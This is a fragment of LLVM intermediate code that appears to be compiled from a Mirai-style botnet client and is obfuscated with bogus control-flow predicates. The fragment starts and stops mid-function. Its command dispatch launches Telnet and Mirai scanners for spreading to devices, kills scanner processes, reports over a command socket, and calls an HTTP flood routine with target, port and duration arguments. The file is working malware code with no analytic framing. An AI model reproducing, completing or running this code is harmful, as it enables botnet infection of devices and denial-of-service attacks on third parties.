  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %1337

; <label>:172:                                    ; preds = %originalBBpart216
  br label %173

; <label>:173:                                    ; preds = %172
  store i32 0, i32* %6, align 4
  br label %174

; <label>:174:                                    ; preds = %209, %173
  %175 = load i32, i32* %6, align 4
  %176 = load i32, i32* %7, align 4
  %177 = icmp slt i32 %175, %176
  br i1 %177, label %178, label %212

; <label>:178:                                    ; preds = %174
  %179 = load i32, i32* @x.85
  %180 = load i32, i32* @y.86
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %178
  %187 = call i64 @time(i64* null) #5
  %188 = call i32 @getpid() #5
  %189 = sext i32 %188 to i64
  %190 = xor i64 %187, %189
  %191 = call i32 @getppid() #5
  %192 = sext i32 %191 to i64
  %193 = add nsw i64 %190, %192
  %194 = trunc i64 %193 to i32
  call void @srand(i32 %194) #5
  %195 = call i64 @time(i64* null) #5
  %196 = call i32 @getpid() #5
  %197 = sext i32 %196 to i64
  %198 = xor i64 %195, %197
  %199 = trunc i64 %198 to i32
  call void @init_rand(i32 %199)
  %200 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %200)
  call void @_exit(i32 0) #11
  %201 = load i32, i32* @x.85
  %202 = load i32, i32* @y.86
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBBpart242, label %originalBB22alteredBB

originalBBpart242:                                ; preds = %originalBB22
  unreachable
                                                  ; No predecessors!
  %210 = load i32, i32* %6, align 4
  %211 = add nsw i32 %210, 1
  store i32 %211, i32* %6, align 4
  br label %174

; <label>:212:                                    ; preds = %174
  %213 = load i32, i32* @x.85
  %214 = load i32, i32* @y.86
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %212
  %221 = load i32, i32* @x.85
  %222 = load i32, i32* @y.86
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %229

; <label>:229:                                    ; preds = %originalBBpart246, %66
  %230 = load i8**, i8*** %4, align 8
  %231 = getelementptr inbounds i8*, i8** %230, i64 1
  %232 = load i8*, i8** %231, align 8
  %233 = call i32 @strcmp(i8* %232, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.550, i32 0, i32 0)) #9
  %234 = icmp ne i32 %233, 0
  br i1 %234, label %274, label %235

; <label>:235:                                    ; preds = %229
  %236 = load i32, i32* @x.85
  %237 = load i32, i32* @y.86
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %235
  %244 = load i32, i32* @scanPid, align 4
  %245 = icmp eq i32 %244, 0
  %246 = load i32, i32* @x.85
  %247 = load i32, i32* @y.86
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %245, label %254, label %271

; <label>:254:                                    ; preds = %originalBBpart250
  %255 = load i32, i32* @x.85
  %256 = load i32, i32* @y.86
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %254
  %263 = load i32, i32* @x.85
  %264 = load i32, i32* @y.86
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %1337

; <label>:271:                                    ; preds = %originalBBpart250
  %272 = load i32, i32* @scanPid, align 4
  %273 = call i32 @kill(i32 %272, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %274

; <label>:274:                                    ; preds = %271, %229
  %275 = load i32, i32* @x.85
  %276 = load i32, i32* @y.86
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %274
  %283 = load i8**, i8*** %4, align 8
  %284 = getelementptr inbounds i8*, i8** %283, i64 1
  %285 = load i8*, i8** %284, align 8
  %286 = call i32 @strcmp(i8* %285, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.551, i32 0, i32 0)) #9
  %287 = icmp ne i32 %286, 0
  %288 = load i32, i32* @x.85
  %289 = load i32, i32* @y.86
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %287, label %345, label %296

; <label>:296:                                    ; preds = %originalBBpart258
  %297 = load i32, i32* @x.85
  %298 = load i32, i32* @y.86
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %296
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 1
  %307 = load i8*, i8** %306, align 8
  %308 = call i32 @atoi(i8* %307) #9
  store i32 %308, i32* %9, align 4
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds i8*, i8** %309, i64 2
  %311 = load i8*, i8** %310, align 8
  %312 = call i32 @atoi(i8* %311) #9
  store i32 %312, i32* %10, align 4
  %313 = call i32 @listFork()
  %314 = icmp ne i32 %313, 0
  %315 = load i32, i32* @x.85
  %316 = load i32, i32* @y.86
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %314, label %328, label %323

; <label>:323:                                    ; preds = %originalBBpart262
  %324 = load i32, i32* @mainCommSock, align 4
  %325 = call i32 (i32, i8*, ...) @sockprintf(i32 %324, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.552, i32 0, i32 0))
  %326 = load i32, i32* %10, align 4
  %327 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %326, i32 %327)
  call void @_exit(i32 0) #11
  unreachable

; <label>:328:                                    ; preds = %originalBBpart262
  %329 = load i32, i32* @x.85
  %330 = load i32, i32* @y.86
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %328
  %337 = load i32, i32* @x.85
  %338 = load i32, i32* @y.86
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %1337

; <label>:345:                                    ; preds = %originalBBpart258
  br label %346

; <label>:346:                                    ; preds = %345, %60
  %347 = load i8**, i8*** %4, align 8
  %348 = getelementptr inbounds i8*, i8** %347, i64 0
  %349 = load i8*, i8** %348, align 8
  %350 = call i32 @strcmp(i8* %349, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.553, i32 0, i32 0)) #9
  %351 = icmp ne i32 %350, 0
  br i1 %351, label %584, label %352

; <label>:352:                                    ; preds = %346
  %353 = load i32, i32* @x.85
  %354 = load i32, i32* @y.86
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %352
  %361 = load i8**, i8*** %4, align 8
  %362 = getelementptr inbounds i8*, i8** %361, i64 1
  %363 = load i8*, i8** %362, align 8
  %364 = call i32 @strcmp(i8* %363, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.549, i32 0, i32 0)) #9
  %365 = icmp ne i32 %364, 0
  %366 = load i32, i32* @x.85
  %367 = load i32, i32* @y.86
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %365, label %499, label %374

; <label>:374:                                    ; preds = %originalBBpart270
  %375 = call i32 @fork() #5
  store i32 %375, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %376 = call i64 @sysconf(i32 84) #5
  %377 = trunc i64 %376 to i32
  store i32 %377, i32* %13, align 4
  store i32 999999, i32* %14, align 4
  %378 = load i32, i32* %13, align 4
  %379 = icmp eq i32 %378, 1
  br i1 %379, label %380, label %381

; <label>:380:                                    ; preds = %374
  store i32 500, i32* %14, align 4
  br label %381

; <label>:381:                                    ; preds = %380, %374
  %382 = load i32, i32* %13, align 4
  %383 = icmp sge i32 %382, 2
  br i1 %383, label %384, label %401

; <label>:384:                                    ; preds = %381
  %385 = load i32, i32* @x.85
  %386 = load i32, i32* @y.86
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %384
  store i32 1000, i32* %14, align 4
  %393 = load i32, i32* @x.85
  %394 = load i32, i32* @y.86
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %401

; <label>:401:                                    ; preds = %originalBBpart274, %381
  %402 = load i32, i32* @x.85
  %403 = load i32, i32* @y.86
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %401
  %410 = load i32, i32* %11, align 4
  %411 = icmp ugt i32 %410, 0
  %412 = load i32, i32* @x.85
  %413 = load i32, i32* @y.86
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %411, label %420, label %422

; <label>:420:                                    ; preds = %originalBBpart278
  %421 = load i32, i32* %11, align 4
  store i32 %421, i32* @scanPid, align 4
  br label %1337

; <label>:422:                                    ; preds = %originalBBpart278
  %423 = load i32, i32* @x.85
  %424 = load i32, i32* @y.86
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %422
  %431 = load i32, i32* %11, align 4
  %432 = icmp eq i32 %431, -1
  %433 = load i32, i32* @x.85
  %434 = load i32, i32* @y.86
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br i1 %432, label %441, label %442

; <label>:441:                                    ; preds = %originalBBpart282
  br label %1337

; <label>:442:                                    ; preds = %originalBBpart282
  %443 = load i32, i32* @x.85
  %444 = load i32, i32* @y.86
  %445 = sub i32 %443, 1
  %446 = mul i32 %443, %445
  %447 = urem i32 %446, 2
  %448 = icmp eq i32 %447, 0
  %449 = icmp slt i32 %444, 10
  %450 = or i1 %448, %449
  br i1 %450, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %442
  %451 = load i32, i32* @x.85
  %452 = load i32, i32* @y.86
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %459

; <label>:459:                                    ; preds = %originalBBpart286
  %460 = load i32, i32* @x.85
  %461 = load i32, i32* @y.86
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %459
  store i32 0, i32* %12, align 4
  %468 = load i32, i32* @x.85
  %469 = load i32, i32* @y.86
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br label %476

; <label>:476:                                    ; preds = %495, %originalBBpart290
  %477 = load i32, i32* %12, align 4
  %478 = load i32, i32* %13, align 4
  %479 = icmp slt i32 %477, %478
  br i1 %479, label %480, label %498

; <label>:480:                                    ; preds = %476
  %481 = call i64 @time(i64* null) #5
  %482 = call i32 @getpid() #5
  %483 = sext i32 %482 to i64
  %484 = xor i64 %481, %483
  %485 = call i32 @getppid() #5
  %486 = sext i32 %485 to i64
  %487 = add nsw i64 %484, %486
  %488 = trunc i64 %487 to i32
  call void @srand(i32 %488) #5
  %489 = call i64 @time(i64* null) #5
  %490 = call i32 @getpid() #5
  %491 = sext i32 %490 to i64
  %492 = xor i64 %489, %491
  %493 = trunc i64 %492 to i32
  call void @init_rand(i32 %493)
  %494 = load i32, i32* %14, align 4
  call void @MiraiScanner(i32 100, i32 %494)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %496 = load i32, i32* %12, align 4
  %497 = add nsw i32 %496, 1
  store i32 %497, i32* %12, align 4
  br label %476

; <label>:498:                                    ; preds = %476
  br label %499

; <label>:499:                                    ; preds = %498, %originalBBpart270
  %500 = load i8**, i8*** %4, align 8
  %501 = getelementptr inbounds i8*, i8** %500, i64 1
  %502 = load i8*, i8** %501, align 8
  %503 = call i32 @strcmp(i8* %502, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.550, i32 0, i32 0)) #9
  %504 = icmp ne i32 %503, 0
  br i1 %504, label %528, label %505

; <label>:505:                                    ; preds = %499
  %506 = load i32, i32* @x.85
  %507 = load i32, i32* @y.86
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %505
  %514 = load i32, i32* @scanPid, align 4
  %515 = icmp eq i32 %514, 0
  %516 = load i32, i32* @x.85
  %517 = load i32, i32* @y.86
  %518 = sub i32 %516, 1
  %519 = mul i32 %516, %518
  %520 = urem i32 %519, 2
  %521 = icmp eq i32 %520, 0
  %522 = icmp slt i32 %517, 10
  %523 = or i1 %521, %522
  br i1 %523, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br i1 %515, label %524, label %525

; <label>:524:                                    ; preds = %originalBBpart294
  br label %1337

; <label>:525:                                    ; preds = %originalBBpart294
  %526 = load i32, i32* @scanPid, align 4
  %527 = call i32 @kill(i32 %526, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %528

; <label>:528:                                    ; preds = %525, %499
  %529 = load i8**, i8*** %4, align 8
  %530 = getelementptr inbounds i8*, i8** %529, i64 1
  %531 = load i8*, i8** %530, align 8
  %532 = call i32 @strcmp(i8* %531, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.551, i32 0, i32 0)) #9
  %533 = icmp ne i32 %532, 0
  br i1 %533, label %567, label %534

; <label>:534:                                    ; preds = %528
  %535 = load i32, i32* @x.85
  %536 = load i32, i32* @y.86
  %537 = sub i32 %535, 1
  %538 = mul i32 %535, %537
  %539 = urem i32 %538, 2
  %540 = icmp eq i32 %539, 0
  %541 = icmp slt i32 %536, 10
  %542 = or i1 %540, %541
  br i1 %542, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %534
  %543 = load i8**, i8*** %4, align 8
  %544 = getelementptr inbounds i8*, i8** %543, i64 1
  %545 = load i8*, i8** %544, align 8
  %546 = call i32 @atoi(i8* %545) #9
  store i32 %546, i32* %15, align 4
  %547 = load i8**, i8*** %4, align 8
  %548 = getelementptr inbounds i8*, i8** %547, i64 2
  %549 = load i8*, i8** %548, align 8
  %550 = call i32 @atoi(i8* %549) #9
  store i32 %550, i32* %16, align 4
  %551 = call i32 @listFork()
  %552 = icmp ne i32 %551, 0
  %553 = load i32, i32* @x.85
  %554 = load i32, i32* @y.86
  %555 = sub i32 %553, 1
  %556 = mul i32 %553, %555
  %557 = urem i32 %556, 2
  %558 = icmp eq i32 %557, 0
  %559 = icmp slt i32 %554, 10
  %560 = or i1 %558, %559
  br i1 %560, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br i1 %552, label %566, label %561

; <label>:561:                                    ; preds = %originalBBpart298
  %562 = load i32, i32* @mainCommSock, align 4
  %563 = call i32 (i32, i8*, ...) @sockprintf(i32 %562, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.554, i32 0, i32 0))
  %564 = load i32, i32* %16, align 4
  %565 = load i32, i32* %15, align 4
  call void @MiraiScanner(i32 %564, i32 %565)
  call void @_exit(i32 0) #11
  unreachable

; <label>:566:                                    ; preds = %originalBBpart298
  br label %1337

; <label>:567:                                    ; preds = %528
  %568 = load i32, i32* @x.85
  %569 = load i32, i32* @y.86
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %567
  %576 = load i32, i32* @x.85
  %577 = load i32, i32* @y.86
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %584

; <label>:584:                                    ; preds = %originalBBpart2102, %346
  %585 = load i8**, i8*** %4, align 8
  %586 = getelementptr inbounds i8*, i8** %585, i64 0
  %587 = load i8*, i8** %586, align 8
  %588 = call i32 @strcmp(i8* %587, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.555, i32 0, i32 0)) #9
  %589 = icmp ne i32 %588, 0
  br i1 %589, label %665, label %590

; <label>:590:                                    ; preds = %584
  %591 = load i32, i32* @x.85
  %592 = load i32, i32* @y.86
  %593 = sub i32 %591, 1
  %594 = mul i32 %591, %593
  %595 = urem i32 %594, 2
  %596 = icmp eq i32 %595, 0
  %597 = icmp slt i32 %592, 10
  %598 = or i1 %596, %597
  br i1 %598, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %590
  %599 = load i32, i32* %3, align 4
  %600 = icmp slt i32 %599, 6
  %601 = load i32, i32* @x.85
  %602 = load i32, i32* @y.86
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br i1 %600, label %637, label %609

; <label>:609:                                    ; preds = %originalBBpart2106
  %610 = load i8**, i8*** %4, align 8
  %611 = getelementptr inbounds i8*, i8** %610, i64 3
  %612 = load i8*, i8** %611, align 8
  %613 = call i32 @atoi(i8* %612) #9
  %614 = icmp slt i32 %613, 1
  br i1 %614, label %637, label %615

; <label>:615:                                    ; preds = %609
  %616 = load i32, i32* @x.85
  %617 = load i32, i32* @y.86
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %615
  %624 = load i8**, i8*** %4, align 8
  %625 = getelementptr inbounds i8*, i8** %624, i64 5
  %626 = load i8*, i8** %625, align 8
  %627 = call i32 @atoi(i8* %626) #9
  %628 = icmp slt i32 %627, 1
  %629 = load i32, i32* @x.85
  %630 = load i32, i32* @y.86
  %631 = sub i32 %629, 1
  %632 = mul i32 %629, %631
  %633 = urem i32 %632, 2
  %634 = icmp eq i32 %633, 0
  %635 = icmp slt i32 %630, 10
  %636 = or i1 %634, %635
  br i1 %636, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br i1 %628, label %637, label %638

; <label>:637:                                    ; preds = %originalBBpart2110, %609, %originalBBpart2106
  br label %1337

; <label>:638:                                    ; preds = %originalBBpart2110
  %639 = call i32 @listFork()
  %640 = icmp ne i32 %639, 0
  br i1 %640, label %641, label %642

; <label>:641:                                    ; preds = %638
  br label %1337

; <label>:642:                                    ; preds = %638
  %643 = load i8**, i8*** %4, align 8
  %644 = getelementptr inbounds i8*, i8** %643, i64 1
  %645 = load i8*, i8** %644, align 8
  %646 = load i8**, i8*** %4, align 8
  %647 = getelementptr inbounds i8*, i8** %646, i64 2
  %648 = load i8*, i8** %647, align 8
  %649 = load i8**, i8*** %4, align 8
  %650 = getelementptr inbounds i8*, i8** %649, i64 3
  %651 = load i8*, i8** %650, align 8
  %652 = call i32 @atoi(i8* %651) #9
  %653 = trunc i32 %652 to i16
  %654 = load i8**, i8*** %4, align 8
  %655 = getelementptr inbounds i8*, i8** %654, i64 4
  %656 = load i8*, i8** %655, align 8
  %657 = load i8**, i8*** %4, align 8
  %658 = getelementptr inbounds i8*, i8** %657, i64 5
  %659 = load i8*, i8** %658, align 8
  %660 = call i32 @atoi(i8* %659) #9
  %661 = load i8**, i8*** %4, align 8
  %662 = getelementptr inbounds i8*, i8** %661, i64 6
  %663 = load i8*, i8** %662, align 8
  %664 = call i32 @atoi(i8* %663) #9
  call void @SendHTTP(i8* %645, i8* %648, i16 zeroext %653, i8* %656, i32 %660, i32 %664)
  call void @exit(i32 0) #12
  unreachable

; <label>:665:                                    ; preds = %584
  %666 = load i8**, i8*** %4, align 8
  %667 = getelementptr inbounds i8*, i8** %666, i64 0
  %668 = load i8*, i8** %667, align 8
  %669 = call i32 @strcmp(i8* %668, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.556, i32 0, i32 0)) #9
  %670 = icmp ne i32 %669, 0
  br i1 %670, label %864, label %671

; <label>:671:                                    ; preds = %665
  %672 = load i32, i32* @x.85
  %673 = load i32, i32* @y.86
  %674 = sub i32 %672, 1
  %675 = mul i32 %672, %674
  %676 = urem i32 %675, 2
  %677 = icmp eq i32 %676, 0
  %678 = icmp slt i32 %673, 10
  %679 = or i1 %677, %678
  br i1 %679, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %671
  %680 = load i32, i32* %3, align 4
  %681 = icmp slt i32 %680, 6
  %682 = load i32, i32* @x.85
  %683 = load i32, i32* @y.86
  %684 = sub i32 %682, 1
  %685 = mul i32 %682, %684
  %686 = urem i32 %685, 2
  %687 = icmp eq i32 %686, 0
  %688 = icmp slt i32 %683, 10
  %689 = or i1 %687, %688
  br i1 %689, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br i1 %681, label %755, label %690

; <label>:690:                                    ; preds = %originalBBpart2114
  %691 = load i8**, i8*** %4, align 8
  %692 = getelementptr inbounds i8*, i8** %691, i64 3
  %693 = load i8*, i8** %692, align 8
  %694 = call i32 @atoi(i8* %693) #9
  %695 = icmp eq i32 %694, -1
  br i1 %695, label %755, label %696

; <label>:696:                                    ; preds = %690
  %697 = load i32, i32* @x.85
  %698 = load i32, i32* @y.86
  %699 = sub i32 %697, 1
  %700 = mul i32 %697, %699
  %701 = urem i32 %700, 2
  %702 = icmp eq i32 %701, 0
  %703 = icmp slt i32 %698, 10
  %704 = or i1 %702, %703
  br i1 %704, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %696
  %705 = load i8**, i8*** %4, align 8
  %706 = getelementptr inbounds i8*, i8** %705, i64 2
  %707 = load i8*, i8** %706, align 8
  %708 = call i32 @atoi(i8* %707) #9
  %709 = icmp eq i32 %708, -1
  %710 = load i32, i32* @x.85
  %711 = load i32, i32* @y.86
  %712 = sub i32 %710, 1
  %713 = mul i32 %710, %712
  %714 = urem i32 %713, 2
  %715 = icmp eq i32 %714, 0
  %716 = icmp slt i32 %711, 10
  %717 = or i1 %715, %716
  br i1 %717, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br i1 %709, label %755, label %718

; <label>:718:                                    ; preds = %originalBBpart2118
  %719 = load i8**, i8*** %4, align 8
  %720 = getelementptr inbounds i8*, i8** %719, i64 4
  %721 = load i8*, i8** %720, align 8
  %722 = call i32 @atoi(i8* %721) #9
  %723 = icmp eq i32 %722, -1
  br i1 %723, label %755, label %724

; <label>:724:                                    ; preds = %718
  %725 = load i8**, i8*** %4, align 8
  %726 = getelementptr inbounds i8*, i8** %725, i64 4
  %727 = load i8*, i8** %726, align 8
  %728 = call i32 @atoi(i8* %727) #9
  %729 = icmp sgt i32 %728, 1024
  br i1 %729, label %755, label %730

; <label>:730:                                    ; preds = %724
  %731 = load i32, i32* %3, align 4
  %732 = icmp eq i32 %731, 6
  br i1 %732, label %733, label %756

; <label>:733:                                    ; preds = %730
  %734 = load i32, i32* @x.85
  %735 = load i32, i32* @y.86
  %736 = sub i32 %734, 1
  %737 = mul i32 %734, %736
  %738 = urem i32 %737, 2
  %739 = icmp eq i32 %738, 0
  %740 = icmp slt i32 %735, 10
  %741 = or i1 %739, %740
  br i1 %741, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %733
  %742 = load i8**, i8*** %4, align 8
  %743 = getelementptr inbounds i8*, i8** %742, i64 5
  %744 = load i8*, i8** %743, align 8
  %745 = call i32 @atoi(i8* %744) #9
  %746 = icmp slt i32 %745, 1
  %747 = load i32, i32* @x.85
  %748 = load i32, i32* @y.86
  %749 = sub i32 %747, 1
  %750 = mul i32 %747, %749
  %751 = urem i32 %750, 2
  %752 = icmp eq i32 %751, 0
  %753 = icmp slt i32 %748, 10
  %754 = or i1 %752, %753
